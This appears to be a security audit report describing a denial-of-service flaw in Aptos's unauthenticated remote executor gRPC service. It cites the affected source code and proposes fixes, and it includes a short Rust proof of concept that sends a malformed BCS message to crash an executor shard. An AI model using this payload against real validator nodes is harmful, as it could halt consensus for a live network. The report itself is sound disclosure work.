# Audit Report

## Title
Unauthenticated Remote Executor gRPC Service Allows Denial of Service via Malformed Messages Causing Consensus Failures

## Summary
The remote executor service exposes unauthenticated gRPC endpoints that accept NetworkMessage instances without validation. Malicious actors can send crafted messages with invalid BCS-serialized payloads, causing the receiving nodes to panic during deserialization. This crashes executor shards during consensus block execution, leading to validator liveness failures and network-wide consensus disruption.

## Finding Description

The Aptos remote executor architecture implements distributed sharded block execution where a coordinator sends execution commands to multiple remote executor shards. The critical vulnerability exists in the network message handling layer where:

1. **Unauthenticated Message Reception**: The gRPC service accepts NetworkMessage instances from any network peer without authentication or sender validation. [1](#0-0) 

2. **Unsafe Deserialization on Shard Side**: Remote executor shards deserialize incoming execution commands using `.unwrap()` without error handling, causing panics on invalid data. [2](#0-1) 

3. **Unsafe Deserialization on Coordinator Side**: The coordinator similarly deserializes execution results without error handling. [3](#0-2) 

4. **Consensus Integration**: This remote executor is used during consensus block execution when remote addresses are configured. [4](#0-3) 

**Attack Scenario:**

A malicious actor identifies remote executor shard endpoints and sends crafted NetworkMessage instances with:
- Valid protobuf structure (message bytes + message_type string)
- Invalid BCS-serialized payload that fails deserialization
- Proper message_type routing (e.g., "execute_command_0")

When the receiving node processes the message:
- The gRPC handler routes it to the appropriate channel
- The executor service attempts deserialization with `.unwrap()`
- Deserialization fails, causing a panic
- The executor service thread/process crashes
- The coordinator blocks waiting for results that never arrive
- Consensus block execution hangs, validator becomes non-responsive

The NetworkController uses plain HTTP without TLS or authentication: [5](#0-4) 

The executor service runs in a loop waiting for commands, making it vulnerable to repeated attacks: [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under the Aptos bug bounty program criteria:

1. **Consensus/Safety Violations**: When executor shards crash, validators cannot complete block execution, breaking the consensus protocol's liveness guarantee. This violates the critical invariant that "All validators must produce identical state roots for identical blocks" because affected validators cannot produce any state root at all.

2. **Total Loss of Liveness/Network Availability**: If multiple validators are affected simultaneously, the network cannot reach consensus on new blocks. With Byzantine fault tolerance of <1/3, attacking just 34% of validators causes complete network halt.

3. **Non-recoverable Without Intervention**: Crashed executor services require manual restart, and repeated attacks can maintain the DoS condition indefinitely.

4. **No Authentication Required**: Any attacker with network access can exploit this vulnerability without validator credentials, stake, or privileged access.

The vulnerability affects the critical execution path during consensus: [7](#0-6) 

## Likelihood Explanation

This vulnerability is **highly likely** to be exploitable:

1. **Low Attack Complexity**: Attackers only need to:
   - Identify remote executor addresses (configured in validator setup)
   - Craft invalid BCS bytes (trivial with any random data)
   - Send gRPC requests (standard tooling available)

2. **No Authentication Barrier**: The NetworkController accepts connections from any peer without validation.

3. **Deterministic Crash**: Any malformed BCS payload will reliably cause the `.unwrap()` to panic.

4. **Production Deployment**: When validators enable sharded execution with remote addresses, these endpoints become active attack surfaces.

5. **Repeatable Attack**: Attackers can continuously send malformed messages to maintain DoS condition.

Error handling infrastructure exists but is not used in the deserialization code paths: [8](#0-7) 

## Recommendation

**Immediate Fixes Required:**

1. **Add Authentication**: Implement mutual TLS authentication for remote executor connections, restricting access to trusted coordinator/shard nodes only.

2. **Graceful Error Handling**: Replace `.unwrap()` calls with proper error handling:

```rust
// In remote_cordinator_client.rs line 89:
let request: RemoteExecutionRequest = match bcs::from_bytes(&message.data) {
    Ok(req) => req,
    Err(e) => {
        error!("Failed to deserialize RemoteExecutionRequest: {}", e);
        return ExecutorShardCommand::Stop;
    }
};

// In remote_executor_client.rs line 168:
let result: RemoteExecutionResult = match bcs::from_bytes(&received_bytes) {
    Ok(res) => res,
    Err(e) => {
        error!("Failed to deserialize RemoteExecutionResult: {}", e);
        return Err(VMStatus::Error(...));
    }
};
```

3. **Input Validation**: Add size limits and checksum validation before deserialization.

4. **Network Isolation**: Deploy remote executors on private networks with firewall rules restricting access.

5. **Monitoring**: Add metrics to detect deserialization failures and alert operators.

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
use aptos_protos::remote_executor::v1::NetworkMessage;
use tonic::transport::Channel;
use aptos_protos::remote_executor::v1::network_message_service_client::NetworkMessageServiceClient;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to remote executor shard (assume running on localhost:52200)
    let channel = Channel::from_static("http://127.0.0.1:52200")
        .connect()
        .await?;
    
    let mut client = NetworkMessageServiceClient::new(channel);
    
    // Craft malformed message with invalid BCS data
    let malformed_message = NetworkMessage {
        message: vec![0xFF, 0xFF, 0xFF, 0xFF], // Invalid BCS
        message_type: "execute_command_0".to_string(), // Valid routing
    };
    
    // Send the malformed message
    let request = tonic::Request::new(malformed_message);
    let response = client.simple_msg_exchange(request).await;
    
    // The receiving shard will panic attempting to deserialize
    // causing the executor service to crash
    println!("Attack message sent. Remote executor should crash.");
    
    Ok(())
}
```

**Expected Result**: The remote executor shard crashes with a panic message like "called `Result::unwrap()` on an `Err` value", causing the validator's block execution to hang indefinitely.

**Notes**

This vulnerability demonstrates a critical failure in the security architecture of the remote executor service. While the main Aptos network layer implements comprehensive authentication via Noise protocol handshakes and mutual TLS, the remote executor service bypasses these protections entirely. The use of `.unwrap()` on untrusted network input is a fundamental security anti-pattern that allows trivial denial-of-service attacks against consensus-critical infrastructure. The impact is amplified because these services run in the hot path of block execution, making even temporary disruptions potentially catastrophic for network liveness.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L91-116)
```rust
#[tonic::async_trait]
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L132-138)
```rust
    async fn get_channel(remote_addr: String) -> NetworkMessageServiceClient<Channel> {
        info!("Trying to connect to remote server at {:?}", remote_addr);
        let conn = tonic::transport::Endpoint::new(remote_addr)
            .unwrap()
            .connect_lazy();
        NetworkMessageServiceClient::new(conn).max_decoding_message_size(MAX_MESSAGE_SIZE)
    }
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L79-113)
```rust
impl CoordinatorClient<RemoteStateViewClient> for RemoteCoordinatorClient {
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
    }
```

**File:** execution/executor-service/src/remote_executor_client.rs (L163-172)
```rust
    fn get_output_from_shards(&self) -> Result<Vec<Vec<Vec<TransactionOutput>>>, VMStatus> {
        trace!("RemoteExecutorClient Waiting for results");
        let mut results = vec![];
        for rx in self.result_rxs.iter() {
            let received_bytes = rx.recv().unwrap().to_bytes();
            let result: RemoteExecutionResult = bcs::from_bytes(&received_bytes).unwrap();
            results.push(result.inner?);
        }
        Ok(results)
    }
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L256-276)
```rust
    fn execute_block_sharded<V: VMBlockExecutor>(
        partitioned_txns: PartitionedTransactions,
        state_view: Arc<CachedStateView>,
        onchain_config: BlockExecutorConfigFromOnchain,
    ) -> Result<Vec<TransactionOutput>> {
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        } else {
            Ok(V::execute_block_sharded(
                &SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L215-260)
```rust
    pub fn start(&self) {
        trace!(
            "Shard starting, shard_id={}, num_shards={}.",
            self.shard_id,
            self.num_shards
        );
        let mut num_txns = 0;
        loop {
            let command = self.coordinator_client.receive_execute_command();
            match command {
                ExecutorShardCommand::ExecuteSubBlocks(
                    state_view,
                    transactions,
                    concurrency_level_per_shard,
                    onchain_config,
                ) => {
                    num_txns += transactions.num_txns();
                    trace!(
                        "Shard {} received ExecuteBlock command of block size {} ",
                        self.shard_id,
                        num_txns
                    );
                    let exe_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "execute_block"]);
                    let ret = self.execute_block(
                        transactions,
                        state_view.as_ref(),
                        BlockExecutorConfig {
                            local: BlockExecutorLocalConfig::default_with_concurrency_level(
                                concurrency_level_per_shard,
                            ),
                            onchain: onchain_config,
                        },
                    );
                    drop(state_view);
                    drop(exe_timer);

                    let _result_tx_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "result_tx"]);
                    self.coordinator_client.send_execution_result(ret);
                },
                ExecutorShardCommand::Stop => {
                    break;
                },
            }
        }
```

**File:** execution/executor/src/block_executor/mod.rs (L191-258)
```rust
    fn execute_and_update_state(
        &self,
        block: ExecutableBlock,
        parent_block_id: HashValue,
        onchain_config: BlockExecutorConfigFromOnchain,
    ) -> ExecutorResult<()> {
        let _timer = BLOCK_EXECUTION_WORKFLOW_WHOLE.start_timer();
        let ExecutableBlock {
            block_id,
            transactions,
            auxiliary_info,
        } = block;
        let mut block_vec = self
            .block_tree
            .get_blocks_opt(&[block_id, parent_block_id])?;
        let parent_block = block_vec
            .pop()
            .expect("Must exist.")
            .ok_or(ExecutorError::BlockNotFound(parent_block_id))?;
        let parent_output = &parent_block.output;
        info!(
            block_id = block_id,
            first_version = parent_output.execution_output.next_version(),
            "execute_block"
        );
        let committed_block_id = self.committed_block_id();
        let execution_output =
            if parent_block_id != committed_block_id && parent_output.has_reconfiguration() {
                // ignore reconfiguration suffix, even if the block is non-empty
                info!(
                    LogSchema::new(LogEntry::BlockExecutor).block_id(block_id),
                    "reconfig_descendant_block_received"
                );
                parent_output.execution_output.reconfig_suffix()
            } else {
                let state_view = {
                    let _timer = OTHER_TIMERS.timer_with(&["get_state_view"]);
                    CachedStateView::new(
                        StateViewId::BlockExecution { block_id },
                        Arc::clone(&self.db.reader),
                        parent_output.result_state().latest().clone(),
                    )?
                };

                let _timer = GET_BLOCK_EXECUTION_OUTPUT_BY_EXECUTING.start_timer();
                fail_point!("executor::block_executor_execute_block", |_| {
                    Err(ExecutorError::from(anyhow::anyhow!(
                        "Injected error in block_executor_execute_block"
                    )))
                });

                DoGetExecutionOutput::by_transaction_execution(
                    &self.block_executor,
                    transactions,
                    auxiliary_info,
                    parent_output.result_state(),
                    state_view,
                    onchain_config.clone(),
                    TransactionSliceMetadata::block(parent_block_id, block_id),
                )?
            };

        let output = PartialStateComputeResult::new(execution_output);
        let _ = self
            .block_tree
            .add_block(parent_block_id, block_id, output)?;
        Ok(())
    }
```

**File:** execution/executor-service/src/error.rs (L1-26)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use serde::{Deserialize, Serialize};
use thiserror::Error;

#[derive(Clone, Debug, Deserialize, Error, PartialEq, Eq, Serialize)]
/// Different reasons for executor service fails to execute a block.
pub enum Error {
    #[error("Internal error: {0}")]
    InternalError(String),
    #[error("Serialization error: {0}")]
    SerializationError(String),
}

impl From<bcs::Error> for Error {
    fn from(error: bcs::Error) -> Self {
        Self::SerializationError(format!("{}", error))
    }
}

impl From<aptos_secure_net::Error> for Error {
    fn from(error: aptos_secure_net::Error) -> Self {
        Self::InternalError(error.to_string())
    }
}
```
